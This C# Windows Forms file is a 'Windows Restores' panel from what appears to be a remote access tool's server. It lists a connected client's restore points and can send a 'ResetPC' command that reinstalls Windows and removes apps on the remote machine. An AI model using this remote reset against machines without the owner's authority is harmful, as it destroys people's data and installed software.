using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormWindowsRestores : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private MaterialLabel lblInstallDate;

	private MaterialLabel lblLastReset;

	public DataGridView dataGridViewPoints;

	private DataGridViewTextBoxColumn columnID;

	private DataGridViewTextBoxColumn columnDate;

	private DataGridViewTextBoxColumn columnDesc;

	private DataGridViewTextBoxColumn columnEvent;

	private MaterialButton btnRefresh;

	private MaterialButton btnResetPC;

	public MaterialLabel lblStatus;

	public FormWindowsRestores()
	{
		InitializeComponent();
	}

	private void FormWindowsRestores_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		if (client != null)
		{
			lblStatus.Text = "Requesting information...";
			client.Send(LEB128.Write(new object[1] { "GetRestoresInfo" }));
		}
	}

	private void ChangeScheme(object sender)
	{
		if (base.IsDisposed)
		{
			return;
		}
		try
		{
			bool isDark = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
			Color backColor = (isDark ? Color.FromArgb(50, 50, 50) : Color.White);
			Color foreColor = (isDark ? Color.White : Color.Black);
			Color gridBackColor = (isDark ? Color.FromArgb(40, 40, 40) : Color.FromArgb(242, 242, 242));
			Color gridForeColor = (isDark ? Color.White : Color.Black);
			Color selectionColor = (isDark ? FormMaterial.PrimaryColor : Color.FromArgb(231, 229, 255));
			BackColor = backColor;
			dataGridViewPoints.BackgroundColor = gridBackColor;
			dataGridViewPoints.GridColor = (isDark ? Color.FromArgb(60, 60, 60) : Color.FromArgb(231, 229, 255));
			dataGridViewPoints.ColumnHeadersDefaultCellStyle.BackColor = gridBackColor;
			dataGridViewPoints.ColumnHeadersDefaultCellStyle.ForeColor = gridForeColor;
			dataGridViewPoints.ColumnHeadersDefaultCellStyle.SelectionBackColor = gridBackColor;
			dataGridViewPoints.DefaultCellStyle.BackColor = gridBackColor;
			dataGridViewPoints.DefaultCellStyle.ForeColor = gridForeColor;
			dataGridViewPoints.DefaultCellStyle.SelectionBackColor = selectionColor;
			dataGridViewPoints.DefaultCellStyle.SelectionForeColor = (isDark ? Color.White : Color.FromArgb(71, 69, 94));
			foreach (Control control in base.Controls)
			{
				if (control is MaterialLabel lbl)
				{
					lbl.BackColor = backColor;
					lbl.ForeColor = foreColor;
				}
			}
		}
		catch
		{
		}
	}

	private void btnRefresh_Click(object sender, EventArgs e)
	{
		if (client != null)
		{
			lblStatus.Text = "Refreshing...";
			client.Send(LEB128.Write(new object[1] { "GetRestoresInfo" }));
		}
	}

	private void btnResetPC_Click(object sender, EventArgs e)
	{
		if (client != null && MessageBox.Show("Are you sure you want to reset the client PC?\nThis will reinstall Windows and remove apps.", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.Yes)
		{
			lblStatus.Text = "Reset command sent!";
			client.Send(LEB128.Write(new object[1] { "ResetPC" }));
		}
	}

	public void UpdateInfo(string installDate, string lastReset, object[] points)
	{
		Invoke((MethodInvoker)delegate
		{
			lblInstallDate.Text = "OS Install Date: " + installDate;
			lblLastReset.Text = "Last Reset: " + lastReset;
			dataGridViewPoints.Rows.Clear();
			if (points != null)
			{
				object[] array = points;
				for (int i = 0; i < array.Length; i++)
				{
					object[] values = (object[])array[i];
					dataGridViewPoints.Rows.Add(values);
				}
			}
			lblStatus.Text = "Information updated at " + DateTime.Now.ToShortTimeString();
		});
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		this.lblInstallDate = new MaterialSkin.Controls.MaterialLabel();
		this.lblLastReset = new MaterialSkin.Controls.MaterialLabel();
		this.dataGridViewPoints = new System.Windows.Forms.DataGridView();
		this.columnID = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.columnDate = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.columnDesc = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.columnEvent = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.btnRefresh = new MaterialSkin.Controls.MaterialButton();
		this.btnResetPC = new MaterialSkin.Controls.MaterialButton();
		this.lblStatus = new MaterialSkin.Controls.MaterialLabel();
		((System.ComponentModel.ISupportInitialize)this.dataGridViewPoints).BeginInit();
		base.SuspendLayout();
		this.lblInstallDate.AutoSize = true;
		this.lblInstallDate.Depth = 0;
		this.lblInstallDate.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.lblInstallDate.Location = new System.Drawing.Point(20, 80);
		this.lblInstallDate.MouseState = MaterialSkin.MouseState.HOVER;
		this.lblInstallDate.Name = "lblInstallDate";
		this.lblInstallDate.Size = new System.Drawing.Size(150, 19);
		this.lblInstallDate.TabIndex = 0;
		this.lblInstallDate.Text = "OS Install Date: N/A";
		this.lblLastReset.AutoSize = true;
		this.lblLastReset.Depth = 0;
		this.lblLastReset.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.lblLastReset.Location = new System.Drawing.Point(20, 110);
		this.lblLastReset.MouseState = MaterialSkin.MouseState.HOVER;
		this.lblLastReset.Name = "lblLastReset";
		this.lblLastReset.Size = new System.Drawing.Size(115, 19);
		this.lblLastReset.TabIndex = 1;
		this.lblLastReset.Text = "Last Reset: N/A";
		this.dataGridViewPoints.AllowUserToAddRows = false;
		this.dataGridViewPoints.AllowUserToDeleteRows = false;
		this.dataGridViewPoints.AllowUserToResizeRows = false;
		this.dataGridViewPoints.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
		this.dataGridViewPoints.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.dataGridViewPoints.BackgroundColor = System.Drawing.Color.FromArgb(242, 242, 242);
		this.dataGridViewPoints.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.dataGridViewPoints.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle1.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle1.BackColor = System.Drawing.Color.FromArgb(242, 242, 242);
		dataGridViewCellStyle1.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle1.ForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.FromArgb(242, 242, 242);
		dataGridViewCellStyle1.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle1.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridViewPoints.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle1;
		this.dataGridViewPoints.ColumnHeadersHeight = 30;
		this.dataGridViewPoints.Columns.AddRange(this.columnID, this.columnDate, this.columnDesc, this.columnEvent);
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.SystemColors.Window;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Segoe UI", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.SystemColors.ControlText;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(231, 229, 255);
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.FromArgb(71, 69, 94);
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.dataGridViewPoints.DefaultCellStyle = dataGridViewCellStyle2;
		this.dataGridViewPoints.EnableHeadersVisualStyles = false;
		this.dataGridViewPoints.GridColor = System.Drawing.Color.FromArgb(231, 229, 255);
		this.dataGridViewPoints.Location = new System.Drawing.Point(20, 150);
		this.dataGridViewPoints.Name = "dataGridViewPoints";
		this.dataGridViewPoints.ReadOnly = true;
		this.dataGridViewPoints.RowHeadersVisible = false;
		this.dataGridViewPoints.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dataGridViewPoints.Size = new System.Drawing.Size(760, 240);
		this.dataGridViewPoints.TabIndex = 2;
		this.columnID.HeaderText = "ID";
		this.columnID.Name = "columnID";
		this.columnID.ReadOnly = true;
		this.columnDate.HeaderText = "Date";
		this.columnDate.Name = "columnDate";
		this.columnDate.ReadOnly = true;
		this.columnDesc.HeaderText = "Description";
		this.columnDesc.Name = "columnDesc";
		this.columnDesc.ReadOnly = true;
		this.columnEvent.HeaderText = "Event Type";
		this.columnEvent.Name = "columnEvent";
		this.columnEvent.ReadOnly = true;
		this.btnRefresh.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.btnRefresh.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.btnRefresh.Density = MaterialSkin.Controls.MaterialButton.MaterialButtonDensity.Default;
		this.btnRefresh.Depth = 0;
		this.btnRefresh.HighEmphasis = true;
		this.btnRefresh.Icon = null;
		this.btnRefresh.Location = new System.Drawing.Point(20, 400);
		this.btnRefresh.Margin = new System.Windows.Forms.Padding(4, 6, 4, 6);
		this.btnRefresh.MouseState = MaterialSkin.MouseState.HOVER;
		this.btnRefresh.Name = "btnRefresh";
		this.btnRefresh.NoAccentTextColor = System.Drawing.Color.Empty;
		this.btnRefresh.Size = new System.Drawing.Size(84, 36);
		this.btnRefresh.TabIndex = 3;
		this.btnRefresh.Text = "Refresh";
		this.btnRefresh.Type = MaterialSkin.Controls.MaterialButton.MaterialButtonType.Contained;
		this.btnRefresh.UseAccentColor = false;
		this.btnRefresh.UseVisualStyleBackColor = true;
		this.btnRefresh.Click += new System.EventHandler(btnRefresh_Click);
		this.btnResetPC.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.btnResetPC.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.btnResetPC.Density = MaterialSkin.Controls.MaterialButton.MaterialButtonDensity.Default;
		this.btnResetPC.Depth = 0;
		this.btnResetPC.HighEmphasis = true;
		this.btnResetPC.Icon = null;
		this.btnResetPC.Location = new System.Drawing.Point(660, 400);
		this.btnResetPC.Margin = new System.Windows.Forms.Padding(4, 6, 4, 6);
		this.btnResetPC.MouseState = MaterialSkin.MouseState.HOVER;
		this.btnResetPC.Name = "btnResetPC";
		this.btnResetPC.NoAccentTextColor = System.Drawing.Color.Empty;
		this.btnResetPC.Size = new System.Drawing.Size(120, 36);
		this.btnResetPC.TabIndex = 4;
		this.btnResetPC.Text = "Reset this PC";
		this.btnResetPC.Type = MaterialSkin.Controls.MaterialButton.MaterialButtonType.Contained;
		this.btnResetPC.UseAccentColor = true;
		this.btnResetPC.UseVisualStyleBackColor = true;
		this.btnResetPC.Click += new System.EventHandler(btnResetPC_Click);
		this.lblStatus.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
		this.lblStatus.AutoSize = true;
		this.lblStatus.Depth = 0;
		this.lblStatus.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.lblStatus.Location = new System.Drawing.Point(120, 410);
		this.lblStatus.MouseState = MaterialSkin.MouseState.HOVER;
		this.lblStatus.Name = "lblStatus";
		this.lblStatus.Size = new System.Drawing.Size(46, 19);
		this.lblStatus.TabIndex = 5;
		this.lblStatus.Text = "Status";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(800, 450);
		base.Controls.Add(this.lblStatus);
		base.Controls.Add(this.btnResetPC);
		base.Controls.Add(this.btnRefresh);
		base.Controls.Add(this.dataGridViewPoints);
		base.Controls.Add(this.lblLastReset);
		base.Controls.Add(this.lblInstallDate);
		base.Name = "FormWindowsRestores";
		this.Text = "Windows Restores";
		base.Load += new System.EventHandler(FormWindowsRestores_Load);
		((System.ComponentModel.ISupportInitialize)this.dataGridViewPoints).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
